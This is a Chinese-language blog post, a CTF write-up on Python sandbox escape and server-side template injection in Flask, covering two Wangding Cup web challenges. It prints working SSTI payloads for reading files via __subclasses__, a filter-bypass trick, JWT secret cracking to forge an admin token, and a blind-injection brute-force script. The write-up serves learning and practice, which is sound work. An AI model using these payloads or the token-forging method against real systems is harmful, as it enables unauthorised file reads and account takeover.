@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>Python沙箱逃逸 | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="ctf">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="ctf">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python沙箱逃逸">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/57375/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="ctf">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/Python沙箱逃逸/1.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Python沙箱逃逸/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Python沙箱逃逸/2.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Python沙箱逃逸/3.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Python沙箱逃逸/5.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Python沙箱逃逸/6.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Python沙箱逃逸/7.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Python沙箱逃逸/8.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Python沙箱逃逸/9.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/Python沙箱逃逸/10.png">
+<meta property="og:updated_time" content="2018-09-19T17:17:20.526Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Python沙箱逃逸">
+<meta name="twitter:description" content="ctf">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/Python沙箱逃逸/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Python沙箱逃逸</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#网鼎杯第二场Web：calc"><span class="post-toc-number">1.</span> <span class="post-toc-text">网鼎杯第二场Web：calc</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#网鼎杯第三场：mmmmy"><span class="post-toc-number">2.</span> <span class="post-toc-text">网鼎杯第三场：mmmmy</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-Python沙箱逃逸"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Python沙箱逃逸</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2018-09-19 22:39:00" datetime="2018-09-19T14:39:00.000Z"  itemprop="datePublished">2018-09-19</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf/">ctf</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">6</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>之前接触的大部分是PHP写的服务器端，而除了PHP，Python也可以作为服务器端的语言，利用的是Python的flask模块渲染html模板，同时也可能存在Python语句执行的漏洞，这就是SSTI漏洞，即服务器端模板注入，本篇文章通过网鼎杯的两道SSTI题简单学习了解一下Python沙箱逃逸的原理<a id="more"></a></p>
+<h3 id="网鼎杯第二场Web：calc"><a href="#网鼎杯第二场Web：calc" class="headerlink" title="网鼎杯第二场Web：calc"></a>网鼎杯第二场Web：calc</h3><p>题目如下，是一个计算器，可以执行一些简单的算式，根据题目的提示，可能对我们的输入存在正则匹配过滤，需要我们注意正则表达式</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Python沙箱逃逸/1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[0-9.]+\s*[*+-/]\s*[0-9.]+</span><br></pre></td></tr></table></figure>
+<p>这里的正则表达式存在两个问题</p>
+<p>1.首先是[*+-/]，我们知道’-‘在正则表达式里有特别的意义，表示范围，而在这里并没有被转义，说明是从’+’-‘/‘的字符</p>
+<p>2.正则表达式并没有给出$结尾符，说明我们只需要符合前面的匹配，后面可以任意构造语句执行</p>
+<p>我们可以试着访问index.php</p>
+<p>出现了报错信息</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Python沙箱逃逸/4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>从报错信息可以看出，这里是python写的web</p>
+<p>这里先给出payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+1,().__class__.__base__.__subclasses__()[40](&apos;/flag&apos;).read()</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Python沙箱逃逸/2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>下面我们在Python 2.7环境中一步步看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[40](&apos;/flag&apos;).read()</span><br></pre></td></tr></table></figure>
+<p>为什么就能读取flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line">&lt;type <span class="string">'tuple'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line">&lt;type <span class="string">'tuple'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __subclasses__ of type object at <span class="number">0x6CFEA8E0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;type <span class="string">'type'</span>&gt;, &lt;type <span class="string">'weakref'</span>&gt;, &lt;type <span class="string">'weakcallableproxy'</span>&gt;, &lt;type <span class="string">'weakproxy'</span>&gt;</span><br><span class="line">, &lt;type <span class="string">'int'</span>&gt;, &lt;type <span class="string">'basestring'</span>&gt;, &lt;type <span class="string">'bytearray'</span>&gt;, &lt;type <span class="string">'list'</span>&gt;, &lt;type <span class="string">'N</span></span><br><span class="line"><span class="string">oneType'</span>&gt;, &lt;type <span class="string">'NotImplementedType'</span>&gt;, &lt;type <span class="string">'traceback'</span>&gt;, &lt;type <span class="string">'super'</span>&gt;, &lt;typ</span><br><span class="line">e <span class="string">'xrange'</span>&gt;, &lt;type <span class="string">'dict'</span>&gt;, &lt;type <span class="string">'set'</span>&gt;, &lt;type <span class="string">'slice'</span>&gt;, &lt;type <span class="string">'staticmethod'</span>&gt;,</span><br><span class="line"> &lt;type <span class="string">'complex'</span>&gt;, &lt;type <span class="string">'float'</span>&gt;, &lt;type <span class="string">'buffer'</span>&gt;, &lt;type <span class="string">'long'</span>&gt;, &lt;type <span class="string">'frozen</span></span><br><span class="line"><span class="string">set'</span>&gt;, &lt;type <span class="string">'property'</span>&gt;, &lt;type <span class="string">'memoryview'</span>&gt;, &lt;type <span class="string">'tuple'</span>&gt;, &lt;type <span class="string">'enumerate'</span></span><br><span class="line">&gt;, &lt;type <span class="string">'reversed'</span>&gt;, &lt;type <span class="string">'code'</span>&gt;, &lt;type <span class="string">'frame'</span>&gt;, &lt;type <span class="string">'builtin_function_or_</span></span><br><span class="line"><span class="string">method'</span>&gt;, &lt;type <span class="string">'instancemethod'</span>&gt;, &lt;type <span class="string">'function'</span>&gt;, &lt;type <span class="string">'classobj'</span>&gt;, &lt;type <span class="string">'</span></span><br><span class="line"><span class="string">dictproxy'</span>&gt;, &lt;type <span class="string">'generator'</span>&gt;, &lt;type <span class="string">'getset_descriptor'</span>&gt;, &lt;type <span class="string">'wrapper_desc</span></span><br><span class="line"><span class="string">riptor'</span>&gt;, &lt;type <span class="string">'instance'</span>&gt;, &lt;type <span class="string">'ellipsis'</span>&gt;, &lt;type <span class="string">'member_descriptor'</span>&gt;, &lt;typ</span><br><span class="line">e <span class="string">'file'</span>&gt;, &lt;type <span class="string">'PyCapsule'</span>&gt;, &lt;type <span class="string">'cell'</span>&gt;, &lt;type <span class="string">'callable-iterator'</span>&gt;, &lt;type</span><br><span class="line"><span class="string">'iterator'</span>&gt;, &lt;type <span class="string">'sys.long_info'</span>&gt;, &lt;type <span class="string">'sys.float_info'</span>&gt;, &lt;type <span class="string">'EncodingMap</span></span><br><span class="line"><span class="string">'</span>&gt;, &lt;type <span class="string">'fieldnameiterator'</span>&gt;, &lt;type <span class="string">'formatteriterator'</span>&gt;, &lt;type <span class="string">'sys.version_i</span></span><br><span class="line"><span class="string">nfo'</span>&gt;, &lt;type <span class="string">'sys.flags'</span>&gt;, &lt;type <span class="string">'sys.getwindowsversion'</span>&gt;, &lt;type <span class="string">'exceptions.Bas</span></span><br><span class="line"><span class="string">eException'</span>&gt;, &lt;type <span class="string">'module'</span>&gt;, &lt;type <span class="string">'imp.NullImporter'</span>&gt;, &lt;type <span class="string">'zipimport.zipim</span></span><br><span class="line"><span class="string">porter'</span>&gt;, &lt;type <span class="string">'nt.stat_result'</span>&gt;, &lt;type <span class="string">'nt.statvfs_result'</span>&gt;, &lt;<span class="class"><span class="keyword">class</span> '<span class="title">warnings</span>.</span></span><br><span class="line">WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._Iterat</span><br><span class="line">ionGuard<span class="string">'&gt;, &lt;class '</span>_weakrefset.WeakSet<span class="string">'&gt;, &lt;class '</span>_abcoll.Hashable<span class="string">'&gt;, &lt;type '</span>cl</span><br><span class="line">assmethod<span class="string">'&gt;, &lt;class '</span>_abcoll.Iterable<span class="string">'&gt;, &lt;class '</span>_abcoll.Sized<span class="string">'&gt;, &lt;class '</span>_abcol</span><br><span class="line">l.Containe<span class="string">r'&gt;, &lt;class '</span>_abcoll.Callable<span class="string">'&gt;, &lt;type '</span>dict_keys<span class="string">'&gt;, &lt;type '</span>dict_items</span><br><span class="line"><span class="string">'&gt;, &lt;type '</span>dict_values<span class="string">'&gt;, &lt;class '</span>site._Printe<span class="string">r'&gt;, &lt;class '</span>site._Helpe<span class="string">r'&gt;, &lt;type</span></span><br><span class="line"><span class="string"> '</span>_sre.SRE_Pattern<span class="string">'&gt;, &lt;type '</span>_sre.SRE_Match<span class="string">'&gt;, &lt;type '</span>_sre.SRE_Scanne<span class="string">r'&gt;, &lt;class</span></span><br><span class="line"><span class="string"> '</span>site.Quitte<span class="string">r'&gt;, &lt;class '</span>codecs.IncrementalEncode<span class="string">r'&gt;, &lt;class '</span>codecs.Incrementa</span><br><span class="line">lDecode<span class="string">r'&gt;, &lt;type '</span>operator.itemgette<span class="string">r'&gt;, &lt;type '</span>operator.attrgette<span class="string">r'&gt;, &lt;type '</span>o</span><br><span class="line">perator.methodcalle<span class="string">r'&gt;, &lt;type '</span>functools.partial<span class="string">'&gt;, &lt;type '</span>MultibyteCodec<span class="string">'&gt;, &lt;ty</span></span><br><span class="line"><span class="string">pe '</span>MultibyteIncrementalEncode<span class="string">r'&gt;, &lt;type '</span>MultibyteIncrementalDecode<span class="string">r'&gt;, &lt;type '</span></span><br><span class="line">MultibyteStreamReade<span class="string">r'&gt;, &lt;type '</span>MultibyteStreamWrite<span class="string">r'&gt;]</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40]</span></span><br><span class="line"><span class="string">&lt;type '</span>file<span class="string">'&gt;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们可以发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[40]</span><br></pre></td></tr></table></figure>
+<p>返回的是file类型，我们在后面传入文件名，就相当于读取文件</p>
+<p>这就是python沙箱逃逸的原理</p>
+<p>具体可以参考<a href="https://www.aliyun.com/jiaocheng/437857.html" target="_blank" rel="noopener">https://www.aliyun.com/jiaocheng/437857.html</a></p>
+<h3 id="网鼎杯第三场：mmmmy"><a href="#网鼎杯第三场：mmmmy" class="headerlink" title="网鼎杯第三场：mmmmy"></a>网鼎杯第三场：mmmmy</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Python沙箱逃逸/3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>题目是一个登陆页面，随手试一下用户名test，密码test，成功登录，点击留言，提示只有admin用户才能留言，猜测必须用admin用户登陆，抓包观察</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Python沙箱逃逸/5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Python沙箱逃逸/6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>发现登陆时同时设置了cookie的token字段，而在此访问时，服务器根据token字段识别test用户，观察token值，是经过JWT加密后的值，首先使用 <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener"><strong>c-jwt-cracker</strong></a> 爆破 secret key，结果为</p>
+<p>6a423，然后到<a href="https://jwt.io/进行加密" target="_blank" rel="noopener">https://jwt.io/进行加密</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Python沙箱逃逸/7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>加密后的token值替换原本test的token值伪造admin用户登陆</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Python沙箱逃逸/8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>然后这里的留言post的text存在SSTI漏洞，但是这里过滤了双花括号的写法，我们可以换成流程控制结构的写法 执行语句 ，测试如下： </p>
+<p><img src="/img/Python沙箱逃逸/9.png" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/Python沙箱逃逸/10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>后面的数据就要依靠盲注出来了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=&#123;%  <span class="keyword">if</span> ().__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">'/flag'</span>).read()[<span class="number">0</span>]==<span class="string">'f'</span> %&#125;<span class="number">1</span>&#123;%  <span class="keyword">else</span>  %&#125;<span class="number">0</span>&#123;%  endif  %&#125;</span><br></pre></td></tr></table></figure>
+<p>但是这里还过滤了一些关键字，例如’_’，所以我们可以将这些关键属性class,base等放入别的参数，从而绕过对text参数过滤</p>
+<p>使用payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=&#123;% <span class="keyword">if</span> request.values.e[<span class="number">18</span>] == ()[request.values.a][request.values.b][request.values.c]()[<span class="number">40</span>](request.values.d).read()[<span class="number">0</span>] %&#125;good&#123;% endif %&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=/flag&amp;e=&#125;-&#123;<span class="number">0123456789</span>abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://0fe97b99c09c4a1cbf5eb0610879c4e93f084e23d438487d.game.ichunqiu.com/bbs"</span></span><br><span class="line">all_string = <span class="string">"&#125;-&#123;0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">"token"</span> : <span class="string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.IXEkNe82X4vypUsNeRFbhbXU4KE4winxIhrPiWpOP30"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">39</span>):</span><br><span class="line">        print(<span class="string">'checking '</span>+all_string[j])</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'text'</span>:<span class="string">"&#123;%% if request.values.e[%d] == ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()[%d] %%&#125;good&#123;%% endif %%&#125;"</span>%(j,i),</span><br><span class="line">            <span class="string">'a'</span>:<span class="string">'__class__'</span>,</span><br><span class="line">            <span class="string">'b'</span>:<span class="string">'__base__'</span>,</span><br><span class="line">            <span class="string">'c'</span>:<span class="string">'__subclasses__'</span>,</span><br><span class="line">            <span class="string">'d'</span>:<span class="string">'/flag'</span>,</span><br><span class="line">            <span class="string">'e'</span>:all_string</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url=url,data=data,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'good'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag = flag + all_string[j]</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of flag is: '</span>+all_string[j])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span>  <span class="string">'good'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> j == <span class="number">38</span>:</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">print(<span class="string">'flag: '</span> + flag)</span><br><span class="line"><span class="comment">#flag: flag&#123;49ec4dfd-6600-4651-a5ff-9c190562991f&#125;</span></span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2018-09-19T17:17:20.526Z" itemprop="dateUpdated">2018-09-20 01:17:20</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/57375/" target="_blank" rel="external">https://Foxgrin.github.io/posts/57375/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/57375/&title=《Python沙箱逃逸》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/57375/&title=《Python沙箱逃逸》 — Somnus's blog&source=之前接触的大部分是PHP写的服务器端，而除了PHP，Python也可以作为服务器端的语言，利用的是Python的flask模块渲染html模板，同时也可能..." data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/57375/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Python沙箱逃逸》 — Somnus's blog&url=https://Foxgrin.github.io/posts/57375/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/57375/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/41464/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：代码审计-通过preg_replace函数深入命令执行
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/15234/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：2018黑盾杯Web">下一篇：2018黑盾杯Web</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
